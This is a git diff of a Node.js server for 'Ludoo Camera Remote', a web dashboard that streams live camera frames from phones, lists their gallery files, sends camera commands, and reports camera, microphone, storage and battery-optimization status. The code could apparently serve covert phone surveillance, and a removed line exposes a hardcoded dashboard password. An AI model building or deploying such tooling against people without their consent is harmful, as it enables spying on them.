             const escapedName = data.fileName.replace(/"/g, '&#34;');
             const thumbImg = document.querySelector('img[data-filename="' + escapedName + '"]');
@@ -1645,7 +1864,7 @@ app.get('/gallery/:deviceId', requireAuth, (req, res) => {
             };
             vidEl.onerror = function() {
                 vidEl.onerror = null;
-                _startVideoRetry(file, Math.min(_vidRetryCount + 1, VID_MAX_RETRIES - 1));
+                _startVideoRetry(file, _vidRetryCount + 1);
             };
             vidEl.src = streamUrl;
             vidEl.load();
@@ -1683,7 +1902,7 @@ io.on('connection', (socket) => {
         if (cameraPermission !== undefined) device.cameraPermission = cameraPermission;
         if (batteryOptimization !== undefined) device.batteryOptimization = batteryOptimization;
         device.lastHeartbeat = new Date().toLocaleTimeString();
-        device.lastSeen = Date.now();  // 🔥 ALWAYS UPDATE!
+        device.lastSeen = Date.now();
 
         socket.deviceId = canonicalId;
         socket.join('streamers');
@@ -1698,10 +1917,8 @@ io.on('connection', (socket) => {
             cameraPermission: device.cameraPermission || false,
             batteryOptimization: device.batteryOptimization || false,
             batteryPercentage: device.batteryPercentage || 0,
-            isConnected: true,
-            hasWebSocket: true,
-            lastHeartbeat: device.lastHeartbeat,
-            connectedAt: device.connectedAt,
+            isConnected: true, hasWebSocket: true,
+            lastHeartbeat: device.lastHeartbeat, connectedAt: device.connectedAt,
             galleryCount: (galleryData[device.id] || []).length
         });
     });
@@ -1718,7 +1935,7 @@ io.on('connection', (socket) => {
         if (batteryOptimization !== undefined) device.batteryOptimization = batteryOptimization;
         if (batteryPercentage !== undefined) device.batteryPercentage = batteryPercentage;
         if (streaming !== undefined) device.streaming = streaming;
-        device.lastSeen = Date.now();  // 🔥 ALWAYS UPDATE!
+        device.lastSeen = Date.now();
 
         console.log(`🔄 Status update [${canonicalId}]: cam=${cameraPermission} batt=${batteryOptimization}`);
         io.emit('device_update', {
@@ -1728,10 +1945,8 @@ io.on('connection', (socket) => {
             cameraPermission: device.cameraPermission || false,
             batteryOptimization: device.batteryOptimization || false,
             batteryPercentage: device.batteryPercentage || 0,
-            isConnected: true,
-            hasWebSocket: true,
-            lastHeartbeat: device.lastHeartbeat,
-            connectedAt: device.connectedAt,
+            isConnected: true, hasWebSocket: true,
+            lastHeartbeat: device.lastHeartbeat, connectedAt: device.connectedAt,
             galleryCount: (galleryData[device.id] || []).length
         });
     });
@@ -1790,7 +2005,7 @@ io.on('connection', (socket) => {
         }
     });
 
-    socket.on('send_command', (data) => {
+    socket.on('send_command', (data, acknowledge) => {
         const { deviceId, command, value } = data;
 
         const ds = getDeviceSettings(deviceId);
@@ -1805,44 +2020,25 @@ io.on('connection', (socket) => {
 
         const cmd = { command, value: value ?? null };
 
-        if (deviceId) {
-            if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-            pendingCommands[deviceId].push(cmd);
+        const delivery = deliverCommand(deviceId, cmd);
+        if (typeof acknowledge === 'function') {
+            acknowledge({ success: delivery !== 'invalid', delivery });
         }
-
-        console.log(`⚡ WS Command [${command}] queued for device [${deviceId}]`);
+        console.log(`⚡ WS Command ${delivery} [${command}] for device [${deviceId}]`);
     });
 
-    // ✅ WEBSOCKET DISCONNECT - 30 second wait
     socket.on('disconnect', () => {
         if (socket.deviceId) {
             const disconnectedId = socket.deviceId;
-            console.log(`⚠️ Device [${disconnectedId}] WS drop — waiting 30s for reconnect`);
-            
             setTimeout(() => {
                 if (activeStreams[disconnectedId] === socket.id) {
                     delete activeStreams[disconnectedId];
                     console.log(`📴 Device [${disconnectedId}] WS stream ended`);
-                    
-                    // ✅ Keep device alive! Don't mark offline
-                    const device = devices.find(d => d.id === disconnectedId);
-                    if (device) {
-                        device.lastSeen = Date.now();  // Keep alive!
-                        device.status = 'reconnecting';
-                        device.lastHeartbeat = new Date().toLocaleTimeString();
-                        
-                        io.emit('device_update', {
-                            id: device.id,
-                            name: device.name,
-                            isConnected: true,
-                            hasWebSocket: false,
-                            status: 'reconnecting',
-                            lastHeartbeat: device.lastHeartbeat,
-                            // ... other fields
-                        });
-                    }
                 }
-            }, DISCONNECT_WAIT);  // 30 seconds
+            }, 8000);
+            console.log(`⚠️ Device [${disconnectedId}] WS drop — waiting 8s for reconnect`);
+        } else {
+            console.log(`🔌 WS client disconnected: ${socket.id}`);
         }
     });
 });
@@ -2055,13 +2251,49 @@ app.get('/', requireAuth, (req, res) => {
 </div>
 <div id="statusModal" class="status-modal">
     <div class="status-modal-content">
-        <div class="status-modal-header"><span class="status-modal-title" id="modalDeviceName">Device</span><button class="status-modal-close" onclick="closeStatusModal()">✕</button></div>
-        <div id="modalContent"></div>
+        <div class="status-modal-header">
+            <span class="status-modal-title" id="modalDeviceName">📱 Device</span>
+            <button class="status-modal-close" onclick="closeStatusModal()">✕</button>
+        </div>
+        
+        <!-- ✅ STATUS CHECK BUTTON -->
+        <div style="display:flex; gap:10px; margin-bottom:15px;">
+            <button onclick="checkDeviceStatus()" id="checkStatusBtn" 
+                style="flex:1; padding:12px; background:linear-gradient(135deg,#667eea,#764ba2); 
+                       border:none; border-radius:10px; color:white; font-weight:600; 
+                       cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px;">
+                🔍 Check Status
+            </button>
+            <button onclick="closeStatusModal()" 
+                style="padding:12px 20px; background:#333; border:none; border-radius:10px; 
+                       color:white; cursor:pointer;">
+                ✕
+            </button>
+        </div>
+        
+        <!-- ✅ LOADING INDICATOR -->
+        <div id="statusLoading" style="display:none; text-align:center; padding:20px;">
+            <div style="font-size:24px; margin-bottom:10px;">⏳</div>
+            <div style="color:#888;">Checking device status...</div>
+            <div style="color:#555; font-size:12px; margin-top:5px;">Device se response aa raha hai</div>
+        </div>
+        
+        <!-- ✅ STATUS CONTENT -->
+        <div id="modalContent">
+            <div class="status-item"><span class="status-label">Connection</span>
+                <span class="status-pending">⏳ Click Check Status</span>
+            </div>
+        </div>
+        
+        <!-- ✅ STATUS UPDATE TIME -->
+        <div id="statusUpdateTime" style="text-align:center; color:#555; font-size:10px; margin-top:10px;">
+            Last checked: Never
+        </div>
     </div>
 </div>
 <script src="/socket.io/socket.io.js"></script>
 <script>
-    const socket = io({ transports: ['websocket'] });
+    const socket = io({ transports: ['websocket', 'polling'] });
     let wsReady = false;
 
     socket.on('connect', () => {
@@ -2070,7 +2302,7 @@ app.get('/', requireAuth, (req, res) => {
     });
     socket.on('disconnect', () => {
         wsReady = false;
-        document.getElementById('connMode').textContent = '⚠ WebSocket disconnected';
+        document.getElementById('connMode').textContent = '⚠ WebSocket disconnected — using HTTP';
     });
 
     socket.on('device_update', (data) => {
@@ -2082,6 +2314,26 @@ app.get('/', requireAuth, (req, res) => {
         }
         renderDeviceList();
         if (selectedDeviceId === data.id) checkSelectedDeviceStatus(currentDevices);
+    });
+
+    socket.on('device_status_detailed', (data) => {
+        if (data.deviceId === currentStatusDeviceId) {
+            // ✅ Update modal with new status
+            const device = data.status;
+            updateStatusDisplay(device);
+            document.getElementById('statusLoading').style.display = 'none';
+            document.getElementById('checkStatusBtn').disabled = false;
+            document.getElementById('checkStatusBtn').innerHTML = '🔍 Check Status';
+            document.getElementById('statusUpdateTime').textContent = 
+                'Last checked: ' + new Date().toLocaleTimeString();
+            
+            // ✅ Update device in list
+            const idx = currentDevices.findIndex(d => d.id === data.deviceId);
+            if (idx !== -1) {
+                currentDevices[idx] = { ...currentDevices[idx], ...device };
+                renderDeviceList();
+            }
+        }
     });
 
     socket.on('frame', (data) => {
@@ -2097,6 +2349,8 @@ app.get('/', requireAuth, (req, res) => {
     let selectedDeviceId = null, currentDevices = [], isStreaming = false, wasStreaming = false;
     let userStoppedStream = false;
     let frameCount = 0, lastFpsUpdate = Date.now(), framePollTimer = null, lastFrameTs = 0;
+    let currentStatusDeviceId = null;
+    let statusCheckTimeout = null;
 
     const video = document.getElementById('video'),
           placeholder = document.getElementById('placeholder'),
@@ -2153,6 +2407,12 @@ app.get('/', requireAuth, (req, res) => {
         if (!selectedDeviceId) { alert('Select a device first'); return; }
         if (wsReady) {
             socket.emit('send_command', { deviceId: selectedDeviceId, command, value: value ?? null });
+        } else {
+            fetch('/api/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ deviceId: selectedDeviceId, command, value: value ?? null })
+            }).catch(() => {});
         }
     }
 
@@ -2192,20 +2452,28 @@ app.get('/', requireAuth, (req, res) => {
     };
     function sendCameraFlip(camera) {
         setCameraBtn(camera);
-        socket.emit('send_command', { deviceId: selectedDeviceId, command: 'flip', value: camera });
+        if (wsReady) {
+            socket.emit('send_command', { deviceId: selectedDeviceId, command: 'flip', value: camera });
+        } else {
+            fetch('/api/flip', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ deviceId: selectedDeviceId, camera })
+            }).catch(() => {});
+        }
     }
 
     document.querySelectorAll('.quality-btn').forEach(btn => {
         btn.onclick = () => {
             document.querySelectorAll('.quality-btn').forEach(b => b.classList.remove('active'));
             btn.classList.add('active');
-            socket.emit('send_command', { deviceId: selectedDeviceId, command: 'quality', value: parseInt(btn.dataset.quality) });
+            sendCommand('quality', parseInt(btn.dataset.quality));
         };
     });
     fpsSlider.oninput = () => {
         const fps = parseInt(fpsSlider.value);
         fpsLabel.textContent = fps + ' FPS' + (fps === 15 ? ' (Recommended)' : '');
-        socket.emit('send_command', { deviceId: selectedDeviceId, command: 'fps', value: fps });
+        sendCommand('fps', fps);
         if (isStreaming) startFramePoll();
     };
 
@@ -2279,22 +2547,231 @@ app.get('/', requireAuth, (req, res) => {
         }
     }, { passive: false });
 
-    function closeStatusModal() { document.getElementById('statusModal').style.display = 'none'; }
+    function closeStatusModal() { 
+        document.getElementById('statusModal').style.display = 'none';
+        currentStatusDeviceId = null;
+        if (statusCheckTimeout) {
+            clearTimeout(statusCheckTimeout);
+            statusCheckTimeout = null;
+        }
+    }
+    
     function showDeviceStatus(device) {
+        currentStatusDeviceId = device.id;
+        
         document.getElementById('modalDeviceName').textContent = '📱 ' + device.name;
+        document.getElementById('statusLoading').style.display = 'none';
+        document.getElementById('checkStatusBtn').disabled = false;
+        document.getElementById('checkStatusBtn').innerHTML = '🔍 Check Status';
+        
+        // Show current cached status
+        updateStatusDisplay(device);
+        
+        document.getElementById('statusModal').style.display = 'flex';
+        document.getElementById('statusUpdateTime').textContent = 
+            'Last checked: ' + (device.lastStatusUpdate || 'Never');
+    }
+
+    function updateStatusDisplay(device) {
         const battery = device.batteryPercentage || 0;
         const ws = device.hasWebSocket;
+
+        const statusClass = (value) => value ? 'status-allowed' : 'status-denied';
         document.getElementById('modalContent').innerHTML =
-            '<div class="status-item"><span class="status-label">Connection</span><span class="' + (device.isConnected ? 'status-allowed' : 'status-denied') + '">' + (device.isConnected ? '● Connected' : '● Disconnected') + '</span></div>' +
-            '<div class="status-item"><span class="status-label">WebSocket</span><span class="' + (ws ? 'status-allowed' : 'status-pending') + '">' + (ws ? '⚡ Active' : '⏳ HTTP only') + '</span></div>' +
-            '<div class="status-item"><span class="status-label">Camera Permission</span><span class="' + (device.cameraPermission ? 'status-allowed' : 'status-denied') + '">' + (device.cameraPermission ? 'Allowed' : 'Denied') + '</span></div>' +
-            '<div class="status-item"><span class="status-label">Battery Optimization</span><span class="' + (device.batteryOptimization ? 'status-allowed' : 'status-denied') + '">' + (device.batteryOptimization ? '✅ Ignored' : '❌ Not Ignored') + '</span></div>' +
-            '<div class="status-item"><span class="status-label">Camera Ready</span><span class="' + (device.cameraReady ? 'status-allowed' : 'status-pending') + '">' + (device.cameraReady ? 'Yes' : 'No') + '</span></div>' +
-            '<div class="status-item"><span class="status-label">Streaming</span><span class="' + (device.streaming ? 'status-allowed' : 'status-pending') + '">' + (device.streaming ? 'Active' : 'Idle') + '</span></div>' +
-            '<div class="status-item"><span class="status-label">Battery</span><div class="flex-row"><span>' + battery + '%</span><div class="battery-bar-small"><div class="battery-fill-small" style="width:' + battery + '%"></div></div></div></div>' +
-            '<div class="status-item"><span class="status-label">Gallery Files</span><span style="color:#ccc">' + (device.galleryCount || 0) + ' files</span></div>' +
-            '<div class="status-item"><span class="status-label">Last Heartbeat</span><span style="color:#ccc">' + (device.lastHeartbeat || 'N/A') + '</span></div>';
-        document.getElementById('statusModal').style.display = 'flex';
+            '<div class="status-item"><span class="status-label">🔋 Battery Percentage</span>' +
+                '<span class="status-value">' + battery + '%</span></div>' +
+            '<div class="status-item"><span class="status-label">📷 Camera Permission</span>' +
+                '<span class="' + statusClass(device.cameraPermission) + '">' +
+                    (device.cameraPermission ? '✅ Allowed' : '❌ Denied') + '</span></div>' +
+            '<div class="status-item"><span class="status-label">💾 Storage Permission</span>' +
+                '<span class="' + statusClass(device.storagePermission) + '">' +
+                    (device.storagePermission ? '✅ Allowed' : '❌ Denied') + '</span></div>' +
+            '<div class="status-item"><span class="status-label">🎤 Mic Permission</span>' +
+                '<span class="' + statusClass(device.microphonePermission) + '">' +
+                    (device.microphonePermission ? '✅ Allowed' : '❌ Denied') + '</span></div>' +
+            '<div class="status-item"><span class="status-label">⚡ Battery Optimization</span>' +
+                '<span class="' + statusClass(device.batteryOptimization) + '">' +
+                    (device.batteryOptimization ? '✅ Enabled' : '❌ Disabled') + '</span></div>';
+        return;
+        
+        document.getElementById('modalContent').innerHTML = \`
+            <!-- ✅ Connection -->
+            <div class="status-item">
+                <span class="status-label">🔌 Connection</span>
+                <span class="\${device.isConnected ? 'status-allowed' : 'status-denied'}">
+                    \${device.isConnected ? '● Connected' : '○ Disconnected'}
+                </span>
+            </div>
+            
+            <!-- ✅ WebSocket -->
+            <div class="status-item">
+                <span class="status-label">⚡ WebSocket</span>
+                <span class="\${ws ? 'status-allowed' : 'status-pending'}">
+                    \${ws ? '⚡ Active' : '⏳ HTTP only'}
+                </span>
+            </div>
+            
+            <!-- ✅ Network -->
+            <div class="status-item">
+                <span class="status-label">📶 Network</span>
+                <span class="\${device.networkConnected ? 'status-allowed' : 'status-denied'}">
+                    \${device.networkConnected ? '✅ Connected' : '❌ Disconnected'}
+                </span>
+            </div>
+            
+            <!-- ✅ Camera -->
+            <div class="status-item">
+                <span class="status-label">📷 Camera</span>
+                <span class="\${device.cameraReady ? 'status-allowed' : 'status-pending'}">
+                    \${device.cameraReady ? '✅ Ready' : '⏳ Not Ready'}
+                    \${device.camera ? ' (' + device.camera + ')' : ''}
+                </span>
+            </div>
+            
+            <!-- ✅ Camera Permission -->
+            <div class="status-item">
+                <span class="status-label">📷 Camera Permission</span>
+                <span class="\${device.cameraPermission ? 'status-allowed' : 'status-denied'}">
+                    \${device.cameraPermission ? '✅ Allowed' : '❌ Denied'}
+                </span>
+            </div>
+            
+            <!-- ✅ Microphone Permission -->
+            <div class="status-item">
+                <span class="status-label">🎤 Microphone</span>
+                <span class="\${device.microphonePermission ? 'status-allowed' : 'status-denied'}">
+                    \${device.microphonePermission ? '✅ Allowed' : '❌ Denied'}
+                </span>
+            </div>
+            
+            <!-- ✅ Storage Permission -->
+            <div class="status-item">
+                <span class="status-label">💾 Storage</span>
+                <span class="\${device.storagePermission ? 'status-allowed' : 'status-denied'}">
+                    \${device.storagePermission ? '✅ Allowed' : '❌ Denied'}
+                </span>
+            </div>
+            
+            <!-- ✅ Streaming -->
+            <div class="status-item">
+                <span class="status-label">📹 Streaming</span>
+                <span class="\${device.streaming ? 'status-allowed' : 'status-pending'}">
+                    \${device.streaming ? '● Active' : '⏹️ Idle'}
+                </span>
+            </div>
+            
+            <!-- ✅ Audio -->
+            <div class="status-item">
+                <span class="status-label">🎤 Audio</span>
+                <span class="\${device.audioEnabled ? 'status-allowed' : 'status-pending'}">
+                    \${device.audioEnabled ? '🎤 Active' : '🔇 Idle'}
+                </span>
+            </div>
+            
+            <!-- ✅ Quality -->
+            <div class="status-item">
+                <span class="status-label">📐 Quality</span>
+                <span style="color:#ccc">\${device.quality || 240}p</span>
+            </div>
+            
+            <!-- ✅ FPS -->
+            <div class="status-item">
+                <span class="status-label">⚡ FPS</span>
+                <span style="color:#ccc">\${device.fps || 15} FPS</span>
+            </div>
+            
+            <!-- ✅ Battery -->
+            <div class="status-item">
+                <span class="status-label">🔋 Battery</span>
+                <div class="flex-row">
+                    <span style="color:#ccc">\${battery}%</span>
+                    <div class="battery-bar-small">
+                        <div class="battery-fill-small" style="width:\${battery}%; 
+                            background:\${battery > 60 ? 'linear-gradient(90deg,#4CAF50,#8BC34A)' : 
+                                      battery > 30 ? 'linear-gradient(90deg,#FF9800,#FFC107)' : 
+                                      'linear-gradient(90deg,#f44336,#FF5722)'};">
+                        </div>
+                    </div>
+                    \${device.charging ? '⚡ Charging' : ''}
+                </div>
+            </div>
+            
+            <!-- ✅ Battery Optimization -->
+            <div class="status-item">
+                <span class="status-label">⚡ Battery Opt.</span>
+                <span class="\${device.batteryOptimization ? 'status-allowed' : 'status-denied'}">
+                    \${device.batteryOptimization ? '✅ Ignored' : '❌ Not Ignored'}
+                </span>
+            </div>
+            
+            <!-- ✅ Gallery -->
+            <div class="status-item">
+                <span class="status-label">📸 Gallery</span>
+                <span style="color:#ccc">\${device.galleryCount || 0} files</span>
+            </div>
+            
+            <!-- ✅ Memory -->
+            <div class="status-item">
+                <span class="status-label">💾 Memory</span>
+                <span style="color:#ccc">\${device.freeMemory || 0} MB / \${device.totalMemory || 0} MB</span>
+            </div>
+            
+            <!-- ✅ Last Heartbeat -->
+            <div class="status-item">
+                <span class="status-label">⏱️ Last Heartbeat</span>
+                <span style="color:#ccc">\${device.lastHeartbeat || 'N/A'}</span>
+            </div>
+        \`;
+    }
+
+    // ============================================================
+    // ✅ CHECK DEVICE STATUS - SEND COMMAND
+    // ============================================================
+    
+    function checkDeviceStatus() {
+        if (!currentStatusDeviceId) {
+            alert('No device selected!');
+            return;
+        }
+        
+        // Show loading
+        document.getElementById('statusLoading').style.display = 'block';
+        document.getElementById('checkStatusBtn').disabled = true;
+        document.getElementById('checkStatusBtn').innerHTML = '⏳ Sending...';
+        
+        // Send status check command
+        fetch('/api/status/check', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId: currentStatusDeviceId })
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.success) {
+                // ✅ Command sent successfully
+                document.getElementById('checkStatusBtn').innerHTML = '✅ Sent';
+                
+                // Timeout after 10 seconds if no response
+                statusCheckTimeout = setTimeout(() => {
+                    document.getElementById('statusLoading').style.display = 'none';
+                    document.getElementById('checkStatusBtn').disabled = false;
+                    document.getElementById('checkStatusBtn').innerHTML = '🔍 Check Status';
+                    document.getElementById('statusUpdateTime').textContent = 
+                        'Last checked: ⏳ No response (timeout)';
+                }, 10000);
+            } else {
+                document.getElementById('statusLoading').style.display = 'none';
+                document.getElementById('checkStatusBtn').disabled = false;
+                document.getElementById('checkStatusBtn').innerHTML = '🔍 Check Status';
+                alert('Failed to send status check: ' + (data.error || 'Unknown error'));
+            }
+        })
+        .catch(error => {
+            document.getElementById('statusLoading').style.display = 'none';
+            document.getElementById('checkStatusBtn').disabled = false;
+            document.getElementById('checkStatusBtn').innerHTML = '🔍 Check Status';
+            alert('Network error: ' + error.message);
+        });
     }
 
     function selectDevice(deviceId) {
@@ -2525,14 +3002,15 @@ const PORT = process.env.PORT || 5000;
 server.listen(PORT, '0.0.0.0', () => {
     console.log('');
     console.log('═══════════════════════════════════════════════════');
-    console.log('✅  Ludoo Camera Remote  —  SIRF WEBSOCKET');
+    console.log('✅  Ludoo Camera Remote  —  WebSocket + HTTP Mode');
     console.log('═══════════════════════════════════════════════════');
     console.log('🌐  Web UI       : http://localhost:' + PORT);
-    console.log('🔑  Password     : ajaybabu95');
-    console.log('⚡  Transport    : SIRF WEBSOCKET (No polling)');
-    console.log('🔌  Ping Interval: 15 seconds');
-    console.log('⏱️  Stale Timeout: 2 minutes');
-    console.log('📸  Gallery      : ✅ ENABLED');
+    console.log('🔑  Password     : [set via DASHBOARD_PASSWORD env var]');
+    console.log('📦  Batch Upload : POST /api/batch');
+    console.log('⚡  WebSocket    : Stream Only');
+    console.log('📡  Commands     : HTTP Polling + WS');
+    console.log('📸  Gallery      : ✅ ENABLED (Separate Page)');
+    console.log('📊  Status Check : ✅ On-Demand');
     console.log('═══════════════════════════════════════════════════');
     console.log('');
 });
